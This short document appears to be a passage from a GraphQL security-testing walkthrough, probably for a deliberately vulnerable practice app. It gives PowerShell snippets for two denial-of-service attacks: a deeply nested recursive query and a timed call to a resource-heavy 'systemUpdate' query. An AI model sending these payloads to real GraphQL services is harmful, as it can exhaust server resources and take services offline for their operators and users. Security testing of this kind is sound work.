## Denial of Service :: Deep Recursion Query Attack
```powershell

$depthAttackQuery = '
query {
      pastes {
        owner {
          paste {
            edges {
              node {
                  owner {
                    paste {
                      edges {
                        node {
                          owner {
                            paste {
                              edges {
                                node {
                                  owner {
                                    id
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
'

Invoke-GraphQLQuery -Query $depthAttackQuery -Uri $gqlEndpointUri -Raw

```


## Denial of Service :: Resource Intensive Query Attack
```powershell
$timingTestPayload = '
    query TimingTest {
      systemUpdate
    }
'

$start = Get-Date

Invoke-GraphQLQuery -Query $timingTestPayload -Uri $gqlEndpointUri -Raw

$end = Get-Date

$delta = $end - $start
$totalSeconds = $delta.Seconds
$message = "Total seconds to execute query: {0}" -f $totalSeconds

Write-Host -Object $message -ForegroundColor Cyan

```
